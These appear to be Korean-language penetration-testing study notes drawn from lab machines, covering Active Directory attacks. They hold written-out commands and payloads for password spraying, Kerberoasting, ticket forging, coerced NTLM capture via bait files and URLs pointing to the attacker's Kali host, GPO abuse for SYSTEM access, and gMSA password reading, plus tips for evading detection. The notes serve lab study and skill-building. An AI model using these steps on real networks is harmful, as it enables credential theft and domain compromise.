`robocopy` 의 **`/b`(backup mode)를 빠뜨리면 실패함** — `/b` 가 있어야 `SeBackupPrivilege` 를 써서 잠긴 파일을 읽음. 같은 이유로 `Copy-Item` 이 아니라 `Copy-FileSeBackupPrivilege`.

**`utilman` 치환은 `nla:False` 가 전제임** — NLA 가 켜져 있으면 로그온 화면에 도달하기 전에 인증을 요구하므로 경로가 죽음. `nxc` 의 RDP 줄에 `(nla:False)` 가 찍히는지 먼저 볼 것.
⚠️ **`bloodhound-python` 의 `-ns` 는 LDAP 조회의 리졸버만 바꿈.** Kerberos 단계는 **시스템 리졸버**로 `<dc>.<도메인>:88` 을 찾으므로 `/etc/hosts` 에 없으면 `Failed to get Kerberos TGT … Name or service not known` 이 남. [[Vault]] 는 NTLM 폴백으로 수집이 성공했으나 **NTLM 이 꺼진 도메인이면 수집 자체가 실패함.** 그리고 `-ns` 는 **네임서버 IP** 를 받음 — 히스토리에 호스트명을 넣은 시도가 먼저 있었음.


**BloodHound «전에» 4프로토콜 스윕부터 — 30초에 끝나고 셸 가능 여부를 즉답한다.**
```bash
nxc smb   <대역> -u U -p P --shares --continue-on-success
nxc winrm <대역> -u U -p P
nxc rdp   <대역> -u U -p P
nxc ldap  <IP>   -u U -p P --gmsa      # gMSA 후보 즉시 확인
```
⚠️ **대역으로 쏘기 전에 「같은 도메인인가」부터 확인할 것** — nmap 의 `DNS_Domain_Name` 비교로 3초에 안다(A-4-11).

**스윕 출력에서 뽑을 네 가지** ([[Heist]] 실측):
1. `ADMIN$`·`C$` 에 **권한 표시가 없으면** 그 계정은 로컬 관리자가 아니다
2. `signing:True` → SMB 릴레이 죽음(A-5 릴레이 판정의 두 번째 독립 근거)
3. `nla:False` → RDP 로그인 화면 경로(`utilman` 치환)가 살아 있음(B-4)
4. WinRM 인증 성공 → 대화형 셸 가능. **플래그는 반드시 여기서 읽는다**([[Butch]])

**BloodHound 수집 플래그 — 빼면 무엇이 죽는가.**

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-ns <DC-IP>` | DNS 서버를 DC 로 지정 | Kali `/etc/resolv.conf` 는 도메인을 모름 → LDAP 연결 단계에서 이름 해석 실패. ⚠️ **Kerberos 단계는 이걸로 구제되지 않음**(A-51) |
| `-c All` | 모든 수집기 | 기본값은 일부만 돎 — **ACL 엣지(`ReadGMSAPassword` 포함)를 놓친다** |
| `-d <FQDN>` | 도메인 | FQDN 이어야 함. `.local` 오타가 실제로 남(A-4-11) |

**⛔ 그래프는 시작점이지 전부가 아니다 — 둘을 반드시 기억할 것.**
- **BloodHound 데이터는 «수집 시점의 스냅샷»이다.** 파일명이 시각을 말한다([[Heist]] `20260708141821_*.json` = 14:18:21). **내가 만든 변경은 그래프에 없다** — 권한을 추가한 뒤 다시 봐도 옛날 그림이라 재수집해야 한다([[Vault]] 에서 실제로 발생)
- **URA(User Rights Assignment)·로컬 특권은 애초에 수집 대상이 아니다.** [[Heist]] 의 결정타 `SeRestorePrivilege` 가 그래프에 없었다. **그래프에 경로가 없다고 특권이 없는 것이 아니다 — 셸을 잡으면 반드시 `whoami /priv` 를 칠 것**(A-4 · B-42)

**⚠️ DN 의 CN 과 `sAMAccountName` 은 다를 수 있다.** [[Heist]] 의 `enox` 는 DN 이 `CN=NAQI,CN=USERS,DC=HEIST,DC=OFFSEC` 였다. **인증에 쓰는 것은 `sAMAccountName`.** `ldapsearch`·`net rpc`·수동 열거로 사용자 목록을 뽑을 때 CN 만 긁으면 **로그인이 전부 실패한다.**

**BloodHound 없이 같은 것을 보려면** — `bloodyAD --host <DC> -d <도메인> -u U -p P get writable` / `get object <대상> --attr nTSecurityDescriptor`, 또는 `ldapsearch -x -H ldap://<DC> -D 'U@<도메인>' -w P -b 'DC=..,DC=..' '(sAMAccountName=*)' sAMAccountName memberOf`. 공유 열거는 nxc 없이 `smbclient -L //<IP> -U 'U%P'` · `smbmap -H <IP> -u U -p P`.

**AD 피벗 체크리스트 — 자격증명 하나로 다음에 무엇을 시도하는가**
1. `nxc smb <대역> -u U -p P --shares` — 읽기/쓰기 가능한 공유. 쓰기 가능하면 [[Vault]] 식 `ntlm_theft` 로 다음 사용자 해시를 낚는다
2. `bloodhound-python -u U -p P -d <FQDN> -ns <DC-IP> -c All` — 그래프에서 **내 계정에서 나가는 아웃바운드 엣지만** 본다
3. `impacket-GetUserSPNs <FQDN>/U:P -dc-ip <DC>` — Kerberoast (`-m 13100`)
4. `impacket-GetNPUsers <FQDN>/ -usersfile users.txt -no-pass -dc-ip <DC>` — AS-REP (`-m 18200`). **`-usersfile` 이다, `-userfile` 이 아니다**([[Vault]] 에서 실제로 틀림)
5. `nxc ldap <DC> -u U -p P --gmsa` / `--bloodhound` — gMSA·LAPS 확인
6. `nxc smb <대역> -u U -p P -M lsassy` — 다른 호스트에 로그온한 세션의 해시
7. WinRM/RDP/psexec 으로 셸 → `whoami /priv` → **특권 이름으로 경로 결정**
8. SYSVOL 훑기 — `\\<DC>\SYSVOL` 의 `Groups.xml`(GPP `cpassword`)·로그온 스크립트에 평문이 박혀 있는 일이 흔하다

#### B-54. DC 컴퓨터 객체에 붙은 저권한 ACE는 곧 도메인 장악이다

`GenericAll`/`GenericWrite`/`WriteDacl`/`WriteOwner` 는 **한 방향으로 승격되므로 사실상 같은 것**이고, 컴퓨터 객체에서는 **RBCD**(ADCS 불필요) 또는 **Shadow Credentials**(ADCS 필요)로 무기화함. `ReadLAPSPassword` 는 **속성 하나를 읽으면 끝**임.

⚠️ **`inherited=false` 인 ACE가 오설정임.**

- [[Resourced]] — `GenericAll` → RBCD → S4U
- [[Hutch]] — `ReadLAPSPassword` → LAPS 평문 → DCSync

#### B-55. 웹 정찰이 곧 스프레이 재료다 — 실명은 계정명, 저작권 연도는 비밀번호 후보

**⑴ 실명 → 계정명 → 존재 확인 3단 콤보.**
1. `/team`·`/about`·`/staff`·`/contact` 등에서 실명 수집 — `curl … | grep -oP '(?<=<td>)[A-Za-z]+' | paste - -`
2. `username-anarchy` 로 규칙 전개(이름당 14~15종)
3. `kerbrute userenum` 으로 KDC AS-REQ 사전인증 **에러 코드 차이**로 실재 계정만 선별 — `KDC_ERR_C_PRINCIPAL_UNKNOWN`(없음) vs `KDC_ERR_PREAUTH_REQUIRED`(있음)

⭐ **kerbrute 는 비밀번호를 보내지 않아 계정 잠금을 유발하지 않음** — 스프레이 전에 목록을 줄이는 **유일하게 안전한 수단**임. 수동 대안은 `impacket-GetNPUsers <도메인>/<계정> -no-pass` 를 계정마다(느릴 뿐 판정 근거는 동일).
[[Nagoya]] 실측 — 28명 실명 → **405개 후보 → 26개 확정**(전부 `이름.성` 형식, kerbrute 139초). 걸린 규칙이 하나뿐이라는 것 자체가 **조직의 계정 명명 규칙**을 알려줌 — 이후 서비스 계정 이름을 추측할 때 재료가 됨.

**⑵ 비밀번호 후보는 사이트에서 읽음.** 저작권 연도·창립 연도·지역명·제품명. 계절+연도(`Spring2023` 등)는 90일 주기 조직에서 실제로 흔함.
[[Nagoya]] — 푸터 `© 2023` 하나로 후보를 4개(`Spring/Summer/Fall/Winter2023`)로 좁혀 **26계정 × 4회 = 104회**, 계정당 4회로 잠금 임계값(보통 5~10) 아래에 뒀음. craig.carr:Spring2023 · fiona.clark:Summer2023 확보.
→ **잠금 임계값 계산을 «하고» 들어갈 것.** 후보 개수 × 계정 수가 아니라 **계정당 횟수**가 임계값과 비교되는 값임.

**⑶ 스프레이는 `--continue-on-success`.** 첫 성공에서 멈추면 **더 나은 권한의 두 번째 계정을 놓침.** [[Nagoya]] 는 이 옵션이 없었으면 `fiona.clark:Summer2023` 을 놓쳤을 것(결과적으로 craig.carr 만 썼지만).

**⑷ 자격증명 «0개» 상태의 우선순위.**
- **AS-REP 로스팅**(`impacket-GetNPUsers -no-pass`)은 **공짜**라 항상 먼저 때려볼 것 — 전멸해도 5분 손해뿐이고 낭비가 아님
- **널 세션**(`smbclient -L -N`·nxc null·plaintext)은 **한 번만** 확인하고 넘어갈 것 — Server 2019 DC 는 기본적으로 익명 열거를 막음

**출처** — [[Nagoya]]. 사이트 콘텐츠 기반 사전 일반론은 B-6-10, CMS 사용자명 열거는 B-1-32.

**⑸ AS-REP 로스팅이 빈손이면 「옵션 이름」과 「대상 존재」를 나눠서 볼 것.** [[Vault]] 실측 — 두 가지가 동시에 틀려 있었음.

**① 옵션 이름이 틀림.** Kali 에서 실제 usage 를 확인하면 **`-usersfile`(s 가 붙음)** 임:
```text
$ impacket-GetNPUsers -h | grep -i usersfile
  -usersfile USERSFILE  File with user per line to test
```
히스토리에 남은 것은 `-userfile` 이라 인자 파싱에서 거부됨. ⚠️ **구체적 오류 문구는 히스토리에 없어 관측된 것이 아님**(A-6-13 의 사례이기도 함).

**② 옵션을 고쳤어도 결과는 없었음.** BloodHound 수집분이 답을 줌:
```text
$ jq -r '.data[].Properties | select(.dontreqpreauth==true) | .samaccountname' 20260708124927_users.json
(출력 없음)
```
— 출처: `~/PG/Vault/` BloodHound JSON

`DONT_REQ_PREAUTH` 가 켜진 계정이 **하나도 없음.** 게다가 그 시점엔 `-usersfile` 에 넣을 유효한 사용자 목록조차 없었음(SMB 열거 전).

→ **AS-REP 로스팅은 ⑴ 유효한 사용자명 목록과 ⑵ 그중 사전인증 비활성 계정, 둘 다 있어야 성립함.** 하나만 없어도 빈손임. 공짜라 먼저 때려보는 것 자체는 옳으나 **「빈손」을 「내가 틀렸다」로 읽지 말 것.**
→ 자격증명을 하나 얻은 뒤에는 **BloodHound JSON 의 `dontreqpreauth` 로 5초 만에 확정**할 수 있음 — 다시 브루트할 필요 없음.

⚠️ **⑷ 의 「널 세션은 한 번만」은 «열거»에 대한 것임** — 공유 «접근»은 익명 표기가 넷이고 전부 던져볼 값이 있음(A-1-30). 쓰기 공유가 나오면 그 자리에서 강제 인증(B-57).

#### B-56. Kerberoast 로 깬 비밀번호가 로그인이 안 되면 «티켓 재료»로 쓴다

**SPN 계정 비밀번호를 깼는데 어떤 대화형 서비스(WinRM·RDP·SSH)에도 로그인이 안 되면, 그것은 실패가 아니라 «서비스 계정의 정상 상태»임**(A-52). 그 값을 로그인 수단이 아니라 **Kerberos 티켓 위조 재료**로 전환할 것.

**재료 넷과 조달처:**

| 재료 | 조달 |
|---|---|
| 서비스 계정 NT해시 | 평문을 `hashlib.new("md4", pw.encode("utf-16le")).hexdigest()` — 솔트·반복 없음. secretsdump 로 직접 얻었으면 그 값 그대로 |
| 도메인 SID | `impacket-lookupsid <domain>/<any_user>:<pw>@<dc>` 또는 인증된 세션에서 `[System.Security.Principal.WindowsIdentity]::GetCurrent().User.AccountDomainSid.Value` |
| SPN | `impacket-GetUserSPNs` 출력의 `ServicePrincipalName` |
| 사칭할 RID | `500`(Administrator) 고정 |

```text
impacket-ticketer -nthash <NT> -domain-sid <SID> -domain <realm> -spn <SPN> -user-id 500 Administrator
```
→ `.ccache` 생성. **`-spn` 이 있으면 «실버»**(그 서비스 전용), **없고 krbtgt 해시면 «골든»**(도메인 전체). 쓰기 전에 `KRB5CCNAME` 을 **절대 경로**로 export 하고 `klist` 로 확인할 것(A-51).

**etype 이 크랙 가능성과 hashcat 모드를 정함** — `$krb5tgs$23$`(RC4-HMAC)는 NT해시 그대로 암호화라 `-m 13100` 로 rockyou 몇 초([[Nagoya]] 는 **9초**). etype 18(AES256)이면 `-m 19700` 으로 훨씬 느림.

⚠️ **탐지 아티팩트 — `ticketer` 기본 유효기간이 10년**(`-duration` 기본 87600시간). 진짜 KDC 발급 서비스 티켓은 기본 10시간이라 **이 한 줄만 봐도 위조가 드러남.** 조용히 가려면 `-duration` 을 줄일 것.

⚠️ **PAC 서명 강제(KB5020805 / CVE-2022-37967, `KrbtgtFullPacSignature`)가 걸린 DC 에서는 실버티켓이 막힘** — 서명이 krbtgt 키로 만들어져 서비스 계정 해시만으로는 위조 불가. 2023-07 부터 enforcement 기본값. **`PacRequestorEnforcement`(KB5008380)와 다른 것** — 그건 KDC 가 «발급한» 티켓만 검사해 KDC 를 안 거치는 실버티켓엔 안 걸림.

⚠️ **SQL 세션 프롬프트(예: `Administrator dbo@master`)와 `xp_cmdshell` 실행 컨텍스트는 다름.** 프록시 계정 미설정 시 xp_cmdshell 은 **SQL Server 서비스 계정**으로 프로세스를 띄움 — 「SQL 안에서의 sysadmin」이지 「OS 관리자」가 아니므로 SeImpersonate 등 다음 권한상승 단계가 필요할 수 있음(B-46).

**출처** — [[Nagoya]](`svc_mssql:Service1` → 실버티켓 → MSSQL sysadmin → xp_cmdshell → PrintSpoofer).

#### B-57. 쓰기 가능한 SMB 공유는 저장소가 아니라 «자격증명 덫»이다 — 강제 인증

**`smbmap`·`nxc --shares` 출력에 `WRITE` 가 보이면 그 자리에서 미끼 공격을 계획할 것.** 다른 취약점을 찾을 필요 없이 그것이 진입로일 확률이 높음.

**왜 통하는가** — Windows 탐색기(또는 인덱싱 서비스·백신·미리보기 핸들러)가 폴더를 열면 그 안의 특정 파일이 원격 리소스를 자동으로 가져오려 시도함. 그 대상을 **내 Kali 의 UNC 경로**로 지정해 두면 가져오는 과정에서 SMB 인증이 나가고 그것이 NetNTLMv2 임. **사용자가 파일을 「실행」하거나 「열」 필요조차 없음** — 어떤 미끼는 폴더를 여는 것만으로 발동함.

**성립 조건 둘** — ⑴ 내가 UNC·URL 을 심을 수 있는 곳 ⑵ 그것을 열거나 처리하는 Windows 프로세스.

| 열거 중 이것을 보면 | 강제 인증을 의심 |
|---|---|
| 익명·게스트 **쓰기** 가능 공유(`smbmap` 의 `WRITE`) | ★ 미끼 파일 투하 → Responder([[Vault]]) |
| 웹앱의 URL 입력·이미지 프록시·PDF 렌더러·웹훅 테스트 | ★ `?url=<KALI>` → Responder([[Heist]]) |
| 사용자 프로필·홈 디렉터리에 쓰기 가능 | `.url`·`desktop.ini` 를 프로필 루트에 |
| MSSQL 접근권 | `EXEC xp_dirtree '\\<KALI>\x'` → 서비스 계정 해시 |
| 프린터 스풀러(RPC) 열림 | PrinterBug(`SpoolSample`)·PetitPotam — **DC 가 나에게 인증하도록 강제** |
| 아무 인증 실마리도 없는 AD 박스 | LLMNR·NBT-NS 포이즈닝(Responder 수동 대기) |

**절차 3줄:**
```bash
python3 ntlm_theft.py -g all -s <KALI-IP> -f steal
smbclient //IP/<share> -N -c 'prompt OFF; mput *'
sudo responder -I tun0
```
- `-s` 는 **IP 로** — 호스트명을 넣으면 타겟이 해석해야 하는데 타겟 DNS 에 내 Kali 가 없음. 반대로 LLMNR 포이즈닝을 노린다면 **존재하지 않는 호스트명**을 넣어 Responder 가 그 이름을 가로채게 하는 전술도 있음
- `prompt OFF` 가 없으면 `mput` 이 파일마다 y/n 을 물어 24번 멈춤
- `-I` 는 **인터페이스 이름**임. IP 를 넣으면 안 됨([[Vault]] 히스토리에 `sudo responder -I 192.168.45.175` → `-I tun0` 정정 흔적)

**미끼는 발동 조건이 제각각이라 `-g all` 로 24종을 전부 뿌림.** 폴더를 여는 것만으로 발동하는 것이 가장 강함 — `desktop.ini`(폴더 아이콘·툴팁 정의 시스템 파일, 진입 시 무조건 읽힘) · `.scf`(`IconFile=\\<KALI>\…` 필드를 아이콘 렌더 시점에 확인) · `.url`·`.lnk`·`.library-ms`·`Autorun.inf`. 나머지는 Office 문서(원격 이미지·템플릿·스타일시트 페치)와 미디어·핸들러 계열.

**미끼가 안 물면** — ⑴ Responder 배너의 `SMB server [ON]` ⑵ `-s` 와 Responder 바인딩 IP 일치(VPN 재연결이 1순위 원인) ⑶ `ls` 로 업로드 개수 확인 ⑷ **공유가 비워졌는지** — [[Vault]] 에서 캡처 10분 뒤 공유가 비어 있었음 `[가정]` ⑸ 실전이면 사용자를 유도해야 함(랩은 시뮬레이션이 대신 열어 줌).

**얻은 다음의 갈림길 — 캡처인가 릴레이인가.** 즉시 `nmap` 의 `smb2-security-mode` 를 다시 볼 것:
- `signing enabled and **required**` → 릴레이 불가 → **크랙**([[Vault]]·[[Heist]])
- `signing enabled but **not required**` + **다른 호스트 존재** → **릴레이**(`ntlmrelayx`)가 훨씬 강함. 컴퓨터 계정처럼 크랙 불가능한 인증도 릴레이는 그대로 씀

단일 호스트 랩은 릴레이 대상이 없어 항상 크랙임. **시험 AD 세트(DC 1 + 멤버 2~3)에서 이 판단이 갈림** — 멤버 서버의 서명이 꺼져 있으면 DC 의 인증을 그 멤버로 릴레이해 로컬 관리자를 얻음.

**캡처 blob 이 진입 벡터를 증언함** — `MsvAvTargetName`(AV_PAIR id 9)이 `cifs/…` 면 SMB, `HTTP/…` 면 웹 페치가 트리거였음.
⚠️ blob 안의 `NbComputerName`·`DnsComputerName` 은 **Responder 가 무작위로 만든 가짜 서버 신원**임 — 타겟 도메인으로 착각하지 말 것. hashcat 이 쓰는 도메인은 **콜론 3번째 필드**임.
⚠️ **해시를 한 글자도 편집하지 말 것** — 사용자명·도메인·blob 이 전부 HMAC 입력이라 도메인을 FQDN 으로 바꿔 적거나 줄바꿈이 끼면 **정답 비밀번호로도 실패함.**
⚠️ NetNTLMv2 는 **반복 없는 HMAC-MD5 2회**라 stretching 이 없음 — CPU 만으로 rockyou 를 수십 초에 완주함. **완주하고도 안 깨지면 규칙(`-r best64.rule`)을 붙이거나 다른 경로로 갈 것.** 여기서 오래 붙잡는 것이 시험 시간 낭비 1위임. 모드는 `-m 5600`(AS-REP `-m 18200` · Kerberoast TGS-REP `-m 13100` 과 혼동 금지 — B-66).

**이 카드가 가르치는 반사** — 「웹이 없다 → 막다른 길」이 아니라 **「웹이 없다 → SMB 쓰기 공유를 찾아라 → 있으면 강제 인증」**. 진입로가 안 보이는 AD 박스에서 이 사고 하나가 시간을 가장 많이 아낌(익명 표기는 A-1-30, 읽기 전용 공유는 B-27).


**신호.** 웹앱·이미지 프록시·PDF 렌더러·웹훅 테스트 폼 — **서버가 임의 URL 을 가져오는 자리**가 도메인 호스트에 있으면 SSRF 로 읽지 말고 **자격증명 유출구**로 읽는다.

**메커니즘.** Windows 클라이언트는 HTTP `401 Unauthorized` + `WWW-Authenticate: NTLM`(또는 SMB 세션 셋업의 NTLMSSP 협상)을 만나면 사용자에게 묻지 않고 **현재 로그온 세션의 자격증명으로** NTLM 챌린지·리스폰스를 수행한다. SSO 의 설계 의도이고, 공격자가 서버 역할을 맡으면 그대로 유출구가 된다.

**절차.**
1. `sudo responder -I tun0` — ⚠️ **`-I` 는 «인터페이스 이름»이지 IP 가 아니다.** [[Heist]] 는 `sudo responder -I 192.168.45.175` 를 먼저 치고 `-I tun0` 으로 고쳐 다시 쳤다(`~/.zsh_history` 에 두 줄이 연달아 남아 있음). 구체적 오류 문구는 **기록에 없음 — 관측된 것이 아님.** 확정적인 것은 `tun0` 으로 고친 직후 배너가 떴다는 사실뿐. VPN 인터페이스는 거의 항상 `tun0` 이고 `ip -br a` 로 확인하는 습관을 들일 것
2. 배너에서 **세 줄**을 읽는다 — `HTTP server [ON]`(트리거가 HTTP 면 필수) · `Responder IP [x.x.x.x]`(`?url=` 에 넣을 주소, VPN 재연결로 바뀜) · `Challenge set [random]`(레인보우 테이블 무의미, 사전 크랙만 남음). Kali 기본 `Responder.conf` 는 `SMB/HTTP/HTTPS/LDAP = On`, `Challenge = Random` 으로 출하된다
3. **리스너를 «먼저» 띄우고 페이로드를 넣는다.** 서버측 페치는 한 번만 일어난다 — Responder 가 안 떠 있으면 그 요청은 연결 거부로 끝나고, 앱이 결과를 캐시하면 같은 URL 을 다시 넣어도 요청이 안 나갈 수 있다. **방어책: 값을 매번 다르게 만든다** — `?url=http://<KALI>/1`, `/2`, `/3`. 캐시 키가 달라지므로 재시도가 확실히 나간다

**페이로드 변형 — 우선순위 순.** ⚠️ [[Heist]] 에서 **실제로 넣어본 것은 1번뿐**이고 나머지는 실행하지 않았으며 출력을 관측하지 않았다.
1. `http://<KALI>` — 가장 잘 통한다. HTTP 클라이언트를 쓰는 모든 페처가 대상
2. `\\<KALI>\share\x` — UNC. Windows 파일 API 를 태우면 SMB 인증이 나간다([[Vault]] 가 이 형태)
3. `file://<KALI>/share/x` — UNC 의 URL 표기. .NET·일부 라이브러리가 이쪽만 받는다
4. `http://127.0.0.1:<포트>/` — 방향을 바꿔 내부 포트 스캔. 응답 시간·오류 문구 차이로 개폐를 읽는다(B-72 와 같은 사고)
5. `http://<KALI>:80/@<타겟>` · `http://<KALI>#@<타겟>` — 허용목록 우회 변형. 필터가 있을 때만

**1번이 통하면 나머지를 시도할 이유가 없다** — 자격증명은 한 번만 잡으면 된다.

**페이로드를 조각내면 각 조각의 역할이 분명해진다.**

| 조각 | 역할 | 바꾸면 / 빼면 |
|---|---|---|
| `http://` | 스킴. 서버측 HTTP 클라이언트를 태운다 | 빼면 URL 파서가 상대 경로로 해석하거나 예외를 던진다. ⚠️ [[Heist]] 앱이 스킴 없는 값에 어떻게 반응하는지는 **관측 없음** |
| `<KALI-IP>` | Responder 가 바인딩된 주소 | VPN 재연결로 바뀌면 요청이 아무 데도 안 온다. 매번 `ip -br a` |
| (포트 없음) | 기본 80. Responder HTTP 서버가 80 에서 듣는다 | `:8000` 같은 비표준 포트를 쓰면 Responder 는 안 듣는다 |

**경로는 무의미하다** — `?url=http://<KALI>/anything` 이어도 같다. 인증은 첫 요청의 401 응답에서 발생하므로 **목적은 「응답 본문을 받아내는 것」이 아니라 「401 을 한 번 받게 하는 것」**이다. 이 구분이 SSRF 사고와 강제 인증 사고를 가른다.

**진입 벡터는 blob 이 스스로 말해준다 — AV_PAIR 의 `MsvAvTargetName`.** 캡처한 NetNTLMv2 blob 안에 클라이언트가 어느 서비스에 인증하려 했는지가 들어 있다. [[Heist]] = `HTTP/192.168.45.175`(웹 페치가 트리거), [[Vault]] = `cifs/192.168.45.175`(SMB 공유가 트리거). **한 필드로 벡터가 갈린다.**
```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ python3 - <<'EOF'
import binascii,struct
p=open('hash.txt').read().strip().split(':')
print('user=',p[0],'domain=',p[2],'challenge=',p[3])
print('NTProofStr=',p[4])
b=binascii.unhexlify(p[5]); i=28
while i+4<=len(b):
    aid,alen=struct.unpack('<HH',b[i:i+4]); i+=4
    v=b[i:i+alen]; i+=alen
    if aid==0: break
    if aid==9: print('MsvAvTargetName =',v.decode('utf-16le'))
EOF
user= enox domain= HEIST challenge= a9a24c7373e7eaf6
NTProofStr= 812295EA02430380A3C69B6C8CD67A27
MsvAvTargetName = HTTP/192.168.45.175
```
→ **Responder 없이 하려면** `impacket-smbserver share . -smb2support` 를 띄우고 UNC 를 넣는다. NetNTLMv2 가 그대로 콘솔에 찍힌다.

#### B-58. GPO 쓰기 권한 = 그 GPO 가 적용되는 모든 머신에서 SYSTEM

**BloodHound 에서 GPO 에 `GenericWrite`·`WriteDacl`·`WriteOwner` 가 걸린 것을 보면 SharpGPOAbuse.**

GPO 는 두 곳에 나뉘어 저장됨 — **GPC**(LDAP `CN={GUID},CN=Policies,CN=System,…`, 메타데이터·`versionNumber`)와 **GPT**(SYSVOL `\\<도메인>\SysVol\<도메인>\Policies\{GUID}\`, 실제 설정 파일). GPO 쓰기 권한이란 결국 **SYSVOL 의 `GptTmpl.inf` 를 고칠 수 있다**는 뜻임.

고칠 수 있는 것 중 무기가 되는 셋:
- **제한된 그룹(Restricted Groups)** — 「이 컴퓨터의 로컬 Administrators 에 X 를 넣어라」 ← `--AddLocalAdmin`
- **즉시 예약 작업(Immediate Scheduled Task)** — 「SYSTEM 으로 이 명령을 실행하라」 ← `--AddComputerTask`
- 로그온·시작 스크립트

**`Default Domain Policy` 는 도메인 루트에 링크돼 DC 를 포함한 모든 머신에 적용됨** → 로컬 관리자를 심으면 DC 의 로컬 관리자 = 도메인 장악.
```powershell
.\SharpGPOAbuse.exe --AddlocalAdmin --GPOName "Default Domain Policy" --UserAccount <나>
gpupdate /force
net localgroup administrators
```
그리고 **세션을 끊고 다시 붙을 것**(A-4-15). 인자 표기 함정은 A-6-13.

**`GptTmpl.inf` 에는 이름이 아니라 SID 로 기록됨:**
```ini
[Group Membership]
*S-1-5-32-544__Members = *<대상 SID>
```
`S-1-5-32-544` 가 로컬 Administrators 의 잘 알려진 SID 임. 도구가 `SID Value of <계정>` 을 먼저 계산하는 이유가 이것임.

**두 버전 번호를 반드시 함께 올릴 것.** 클라이언트는 GPC 와 GPT 의 버전을 «비교»해 정책이 바뀌었는지 판단함 — 하나만 올리면 불일치로 무시되거나 오류가 남. **손으로 `GptTmpl.inf` 만 고치고 `versionNumber` 를 안 올리는 것이 가장 흔한 실패임.**

**`WriteOwner`·`WriteDacl` 만 있어도 같은 결과** — 단계가 하나 늘 뿐임(`WriteDacl` → 자신에게 `GenericWrite` 부여 → 공격 / `WriteOwner` → 소유권 탈취 → DACL 수정).
**`--AddComputerTask` 는 재로그온이 불필요함** — 즉시 예약 작업으로 SYSTEM 리버스셸을 바로 띄움. 급하면 이쪽.

**Kali 네이티브 대안 — `pygpoabuse`**(업로드 없음, 흔적 적음):
```text
pygpoabuse.py <도메인>/<계정>:<비번> -gpo-id "<GUID>" -command 'net localgroup administrators <나> /add' -f
```

**오설정을 기본 권한 더미에서 골라내는 법** — GPO 의 ACE 를 전부 뽑아 `PrincipalType` 을 볼 것. `Domain Admins`(RID 512)·`Enterprise Admins`(RID 519)는 정상 기본 권한이고 전부 `Group` 임. **`User` 타입 ACE 가 오설정임.**
```bash
jq -r '.data[] | .Properties.name as $n | (.Aces//[])[] | select(.RightName|test("Write")) | [$n,.RightName,.PrincipalSID,.PrincipalType] | @tsv' *_gpos.json
```

**`gpupdate /force` 의 의미** — 그룹 정책은 기본 **90분(±30분 랜덤)**, DC 는 **5분** 마다 새로고침됨. SYSVOL 을 고쳐도 그 주기가 돌아야 반영되고 `/force` 는 「바뀐 것만」이 아니라 모든 정책을 다시 적용함. **대상 위에 이미 셸이 있어야 칠 수 있음** — 워크스테이션이 대상이면 주기를 기다리거나 재로그온을 유도해야 함.

**탐지·방어** — 이벤트 **5136·5137**(디렉터리 객체 변경)로 `versionNumber`·`gPCMachineExtensionNames` 변경, **4663** 으로 SYSVOL `GptTmpl.inf` 변경. **GPO 의 Restricted Groups 변경은 정상 운영에서 극히 드물어 발생 즉시 조사 대상임.**

**출처** — [[Vault]](`anirudh → GenericWrite·WriteOwner·WriteDacl on Default Domain Policy`. `Default Domain Controllers Policy` 에는 그 엣지가 없었음). 컴퓨터 객체 ACE 는 B-54, 특권 축과의 갈림길은 B-53.

#### B-59. gMSA — 크랙할 수 없지만 읽을 수는 있는 계정

**판별 신호 두 개.** ⓐ 계정명이 `$` 로 끝나는데 `C:\Users` 에 프로필이 있다 ⓑ DN 이 `CN=…,CN=Managed Service Accounts,DC=…` 다. 둘 중 하나면 gMSA 를 의심한다.
```bash
jq -r '.data[] | select(.Properties.name=="<계정>$@<DOMAIN>") | .Properties.distinguishedname' <ts>_users.json
```

**왜 크랙이 아니라 ACL 문제인가.** 비밀번호를 관리자가 정하지 않는다 — DC 가 KDS root key 에서 계정별로 파생해 만들고 기본 30일마다 자동 롤한다. 길이는 **240바이트(유니코드 120자)** 라 사전 크랙이 원천 불가다. 대신 `msDS-ManagedPassword` 라는 **계산된(constructed) 속성**으로 LDAP 에서 조회된다 — 디스크에 그 이름으로 저장된 것이 아니라 요청 시점에 DC 가 만들어 준다. 누가 읽을 수 있는지는 `msDS-GroupMSAMembership`(= `PrincipalsAllowedToRetrieveManagedPassword`) 보안 서술자가 정하고, **BloodHound 의 `ReadGMSAPassword` 엣지가 정확히 이 속성을 읽어 만든 것**이다.
→ 같은 이유로 **gMSA·컴퓨터 계정은 Kerberoasting 대상이 아니다.** SPN 이 붙어 있어도 크랙이 안 된다. Kerberoasting 은 「SPN 이 붙은 **사람이 정한 비밀번호** 계정」을 노리는 공격이다 — 열거 결과가 `$` 로 끝나는 계정뿐이면 그 자리에서 접을 것.

**읽는 도구 넷 — 하나 막히면 다음 것.** 넷 다 같은 LDAP 속성 하나를 읽는다. 하나가 안 되면 구현 차이(LDAPS 강제·서명 요구·파이썬 버전)일 뿐이므로 **원리를 의심하지 말고 도구를 바꿀 것.**
1. `bloodyAD --host <DC> -d <FQDN> -u U -p P get object '<계정>$' --attr msDS-ManagedPassword` ← [[Heist]] 성공. **`$` 는 반드시 작은따옴표 안에** (bash 변수 확장)
2. `nxc ldap <IP> -u U -p P --gmsa`
3. `gMSADumper.py -u U -p P -d <FQDN>`
4. 타겟에서 `GMSAPasswordReader.exe --accountname <계정>` ← [[Heist]] 성공. AES Kerberos 키까지 필요할 때

| | bloodyAD (Kali) | GMSAPasswordReader (타겟) |
|---|---|---|
| 파일 업로드 | 불필요 | 필요 — AV·EDR 위험 |
| 얻는 것 | NT 해시 + base64 blob | NT 해시 + AES128/256 Kerberos 키 |
| 언제 | 기본 | AES 만 허용된 도메인(RC4 비활성)에서 Kerberos 를 써야 할 때 |

**시험에서는 bloodyAD 쪽이 낫다** — 업로드가 없어 흔적과 위험이 적다.

**출력을 읽는 법 두 가지.**
- `Old Value` / `Current Value` 가 함께 나온다. gMSA blob 에 이전·현재 비밀번호가 같이 들어 있기 때문이고(롤 직후 미갱신 클라이언트를 위한 유예), **써야 하는 것은 `Current Value`** 다
- `rc4_hmac` 은 **NT 해시와 같은 값**이다(Kerberos etype 23 이 NT 해시를 키로 씀). 그래서 그 한 값이 PtH 에도 `-k` Kerberos 인증에도 쓰인다. `bloodyAD` 의 `.NTLM:` 앞부분 `aad3b435b51404eeaad3b435b51404ee` 는 **빈 LM 해시**다

